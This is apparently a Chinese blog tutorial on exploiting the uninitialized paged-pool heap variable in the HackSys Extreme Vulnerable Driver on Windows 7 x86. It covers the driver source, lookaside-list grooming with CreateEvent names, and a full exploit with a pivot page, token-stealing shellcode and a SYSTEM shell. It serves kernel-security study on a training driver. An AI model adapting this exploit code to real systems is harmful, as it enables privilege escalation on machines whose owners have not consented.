## **前言**

窥探Ring0漏洞世界：未初始化堆变量漏洞

哪怕是类似原理的都用，在利用方式上也总能带来很多新鲜感，每次都有新的长见识，不断的感叹和震撼。

实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

##  **漏洞分析**

老样子，先IDA找到该漏洞的触发函数TriggerUninitializedMemoryPagedPool，分析函数是如何存在漏洞的：

首先依然是申请内存0xf0字节

![](https://image.3001.net/images/20220721/1658380463_62d8e0afdec373e7a029a.png!small)

然后接着取用户参数地址的值，不是魔数就跳转，是魔数就向下走，填充魔数和固定的回调到结构里，然后填充申请内存的多余部分。

![](https://image.3001.net/images/20220721/1658380464_62d8e0b0c49746396aea9.png!small)

最后，判断值，如果输入的地址的值是0，则调用偏移4的回调函数：

![](https://image.3001.net/images/20220721/1658380469_62d8e0b55dce011030cc7.png!small)

查看一下漏洞函数源码：

    
    
    ///
    
    /// Trigger the uninitialized memory in PagedPool Vulnerability
    ///
    
    ///The pointer to user mode buffer
    /// NTSTATUS
    NTSTATUS
    TriggerUninitializedMemoryPagedPool(
    _In_ PVOID UserBuffer
    )
    {
    ULONG_PTR UserValue = 0;
    ULONG_PTR MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PUNINITIALIZED_MEMORY_POOL UninitializedMemory = NULL;
    
    PAGED_CODE();
    
    __try
    {
    //
    // Verify if the buffer resides in user mode
    //
    
    ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_MEMORY_POOL), (ULONG)__alignof(UCHAR));
    
    //
    // Allocate Pool chunk
    //
    
    UninitializedMemory = (PUNINITIALIZED_MEMORY_POOL)ExAllocatePoolWithTag(
    PagedPool,
    sizeof(UNINITIALIZED_MEMORY_POOL),
    (ULONG)POOL_TAG
    );
    
    if (!UninitializedMemory)
    {
    //
    // Unable to allocate Pool chunk
    //
    
    DbgPrint("[-] Unable to allocate Pool chunk\n");
    
    Status = STATUS_NO_MEMORY;
    return Status;
    }
    else
    {
    DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
    DbgPrint("[+] Pool Type: %s\n", STRINGIFY(PagedPool));
    DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(UNINITIALIZED_MEMORY_POOL));
    DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedMemory);
    }
    
    //
    // Get the value from user mode
    //
    
    UserValue = *(PULONG_PTR)UserBuffer;
    
    DbgPrint("[+] UserValue: 0x%p\n", UserValue);
    DbgPrint("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);
    
    //
    // Validate the magic value
    //
    
    if (UserValue == MagicValue) {
    UninitializedMemory->Value = UserValue;
    UninitializedMemory->Callback = &ampUninitializedMemoryPagedPoolObjectCallback
    
    //
    // Fill the buffer with ASCII 'A'
    //
    
    RtlFillMemory(
    (PVOID)UninitializedMemory->Buffer,
    sizeof(UninitializedMemory->Buffer),
    0x41
    );
    
    //
    // Null terminate the char buffer
    //
    
    UninitializedMemory->Buffer[(sizeof(UninitializedMemory->Buffer) / sizeof(ULONG_PTR)) - 1] = '\0';
    }
    #ifdef SECURE
    else {
    DbgPrint("[+] Freeing UninitializedMemory Object\n");
    DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
    DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedMemory);
    
    //
    // Free the allocated Pool chunk
    //
    
    ExFreePoolWithTag((PVOID)UninitializedMemory, (ULONG)POOL_TAG);
    
    //
    // Secure Note: This is secure because the developer is setting 'UninitializedMemory'
    // to NULL and checks for NULL pointer before calling the callback
    //
    
    //
    // Set to NULL to avoid dangling pointer
    //
    
    UninitializedMemory = NULL;
    }
    #else
    //
    // Vulnerability Note: This is a vanilla Uninitialized Heap Variable vulnerability
    // because the developer is not setting 'Value' & 'Callback' to definite known value
    // before calling the 'Callback'
    //
    
    DbgPrint("[+] Triggering Uninitialized Memory in PagedPool\n");
    #endif
    
    //
        // Call the callback function
    //
    
    if (UninitializedMemory)
    {
    DbgPrint("[+] UninitializedMemory->Value: 0x%p\n", UninitializedMemory->Value);
    DbgPrint("[+] UninitializedMemory->Callback: 0x%p\n", UninitializedMemory->Callback);
    
    UninitializedMemory->Callback();
    }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    Status = GetExceptionCode();
    DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
    
    return Status;
    }

整套逻辑和上一篇未初始化栈变量漏洞几乎一样，当输入的值不是魔数，则会掉用指定位置的回调函数，如果是魔数则填充固定的回调函数去调用。

要如何利用，也跟上次思路一样，想办法控制该内存申请出现的位置，提前在内存里布置shellcode地址，然后再调用该漏洞函数触发漏洞，该漏洞是由未初始化和保存回调而导致的，该漏洞的控制码是：0x222033

##  **漏洞利用**

###  **控制分页内存**

要按照上面的思路去进行利用，这里需要解决的一个问题就是，如何从用户层去控制该分页内存申请的位置。

之前在池溢出利用那里，使用了CreateEvent大量创建事件对象（非分页内存池），制造内存合适大小的空洞使得申请的内存被精准投放到事件对象前面。

根据参考资料[1-2]，了解到事件对象本身分配给了非分页池，但是最后一个参数LPCTSTR类型的lpName实际上是在分页池上分配的。

根据那边介绍内存池的论文（参考资料{3]），可以了解到如果空闲内存块插入到了ListHeads
List里，除了固定的8字节池Header，还会在起始8字节加上双向链表指针，当再次分配该内存的时候，前8字节是不受控的，我们完成本次利用需要控制偏移4的4字节内存，所以这里内存是从ListHeads
List里申请的是没法实现的。

除了ListHeads List，还有个提高内存分配效率的Lookaside
List，使用单链表保存空闲块，所以这里希望能将释放的内存块插入到Lookaside List里，然后再分配出来。

首先，第一步，需要确保Lookaside是启用的，该表将会在系统启动2分钟之后惰性启动，需要开机后等两分钟在进行实验。

然后，接下来，确保_KPRCB.PPPagedLookasideList[0x1E]是被控制的（0xf0+0x0f>>3 =
0x1e），这就需要申请大量0xf0大小的分页内存然后释放形成空闲块，内存的构造是，往偏移4的位置写入函数地址，然后其他地方写入随机字符，最后以00结尾截断字符串，注意一点，就是函数地址里不能出现0x00，因为会截断字符串。

这里踩了个大坑，地址里出现00会截断字符串，导致实际上控制的空间不是0x1E这条链表上的，导致利用失败！！

根据官方给出的exp学习到了一种让函数地址不出现00的方法：

    
    
    ULONG_PTR MapPivotPage(PVOID Payload) {
    ULONG_PTR Pivot = 0;
    PVOID BaseAddress = NULL;
    SIZE_T RegionSize = 0x1;
    BOOLEAN PivotMapped = FALSE;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    
    while (!PivotMapped) {
    Pivot = RandomNumber(0x41, 0x4F) & 0xFF;
    Pivot |= (RandomNumber(0x31, 0x3F) & 0xFF) << 8;
    Pivot |= (RandomNumber(0x21, 0x2F) & 0xFF) << 16;
    Pivot |= (RandomNumber(0x11, 0x1F) & 0xFF) << 24;
    
    BaseAddress = (PVOID)Pivot;
    NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    
    NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
    &BaseAddress,
    0,
    &RegionSize,
      MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE);
    
    if (NtStatus == STATUS_SUCCESS) {
    *(PBYTE)Pivot = 0x68;                           // push 32b imm
    *(PULONG_PTR)(Pivot + 1) = (ULONG_PTR)Payload;
    *(PBYTE)(Pivot + 5) = 0xC3;                     // ret
    
    PivotMapped = TRUE;
    }
    }
    
    return Pivot;
    }

通过API NtAllocateVirtualMemory 申请不存在0的可执行地址，然后往里面填入push
address;ret进行跳转，跳转到我们自己的shellcode里去。

关于event名称的构造：

    
    
    char eventName[0xf0] = {0}; 
    for (int j = 0; j < 0xf0 - 4; j++) {
    eventName[j] = RandomNumber(0x41, 0x5A); // From A-Z
    }
    eventName[4] = (UINT_PTR)pvoid & 0xFF;
    eventName[5] = ((UINT_PTR)pvoid & 0xFF00) >> 8;
    eventName[6] = ((UINT_PTR)pvoid & 0xFF0000) >> 16;
    eventName[7] = (UINT_PTR)pvoid >> 24;
    eventName[0xf0 -5] = '\0';
    spray_event1[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)eventName);

因为如果用相同字符串的话，内存里就只会保存一份副本，所以需要使用不同的字符串才能申请多个内存空间出来。

最后，每个Lookaside List最多可以装256个块，所以需要申请256次，再全部释放掉。

编写exp：

    
    
    #include
    #include
    
    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    
    
    typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
    typedef NTSTATUS* PNTSTATUS;
    #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    #define RandomNumber(Minimum, Maximum) (rand()%(int)(Maximum - Minimum) + Minimum)
    
    typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG      ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG      AllocationType,
    IN ULONG      Protect);
    
    
    VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
    pushad
    
    ; 获取当前进程EPROCESS
    xor eax, eax
    mov eax, fs: [eax + KTHREAD_OFFSET]
    mov eax, [eax + EPROCESS_OFFSET]
    mov ecx, eax
    
    ; 搜索system进程EPROCESS
    mov edx, SYSTEM_PID
    SearchSystemPID :
    mov eax, [eax + FLINK_OFFSET]
        sub eax, FLINK_OFFSET
    cmp[eax + PID_OFFSET], edx
    jne SearchSystemPID
    
    ; token窃取
    mov edx, [eax + TOKEN_OFFSET]
    mov[ecx + TOKEN_OFFSET], edx
    
    ; 环境还原+ 返回
    popad
    
    }
    }
    
    
    ULONG_PTR MapPivotPage(PVOID Payload) {
    ULONG_PTR Pivot = 0;
    PVOID BaseAddress = NULL;
    SIZE_T RegionSize = 0x1;
    BOOLEAN PivotMapped = FALSE;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    
    while (!PivotMapped) {
    Pivot = RandomNumber(0x41, 0x4F) & 0xFF;
    Pivot |= (RandomNumber(0x31, 0x3F) & 0xFF) << 8;
    Pivot |= (RandomNumber(0x21, 0x2F) & 0xFF) << 16;
    Pivot |= (RandomNumber(0x11, 0x1F) & 0xFF) << 24;
    
      BaseAddress = (PVOID)Pivot;
    NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    
    NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
    &BaseAddress,
    0,
    &RegionSize,
    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE);
    
    if (NtStatus == STATUS_SUCCESS) {
    *(PBYTE)Pivot = 0x68;                           // push 32b imm
    *(PULONG_PTR)(Pivot + 1) = (ULONG_PTR)Payload;
    *(PBYTE)(Pivot + 5) = 0xC3;                     // ret
    
    PivotMapped = TRUE;
    }
    }
    
    return Pivot;
    }
    
    
    int main()
    {
    ULONG UserBufferSize = 4;
    PVOID EopPayload = &ampTokenStealingPayloadWin7
    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    PULONG UserBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    
    ULONG_PTR pvoid = MapPivotPage(EopPayload);
    printf("payload address:%p", pvoid);
    
    char eventName[0xf0] = {0}; 
    
    // 污染后备链表
    HANDLE spray_event1[1000] = { 0 };
     for (size_t i = 0; i < 256; i++)
    {
    for (int j = 0; j < 0xf0 - 4; j++) {
    eventName[j] = RandomNumber(0x41, 0x5A); // From A-Z
    }
    
    eventName[4] = (UINT_PTR)pvoid & 0xFF;
    eventName[5] = ((UINT_PTR)pvoid & 0xFF00) >> 8;
    eventName[6] = ((UINT_PTR)pvoid & 0xFF0000) >> 16;
    eventName[7] = (UINT_PTR)pvoid >> 24;
    eventName[0xf0 -5] = '\0';
    spray_event1[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)eventName);
    }
    for (size_t i = 0; i < 256; i ++)
    {
    CloseHandle(spray_event1[i]);
    }
    
    ULONG WriteRet = 0;
    DeviceIoControl(hDevice, 0x222033, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
    
    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
    UserBuffer = NULL;
    
    system("pause");
    system("cmd.exe");
    
    return 0;
    }

 **截图展示**

![](https://image.3001.net/images/20220721/1658380470_62d8e0b65491f8f03bf79.png!small)

##  **参考资料**

•[1] Windows Kernel Exploitation Tutorial Part 7: Uninitialized Heap Variable
- rootkit (rootkits.xyz) https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/

•[2] CreateEventA function (synchapi.h) - Win32 apps | Microsoft Docs
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa

•[3] kernelpool-exploitation.pdf (packetstormsecurity.net)
https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf

•[4] HEVD-第七部分-未初始化的堆变量_是脆脆啊的博客-CSDN博客https://blog.csdn.net/qq_36918532/article/details/123393827

•[5] hacksysteam/HackSysExtremeVulnerableDriver: HackSys Extreme Vulnerable
Windows Driver (github.com)
https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

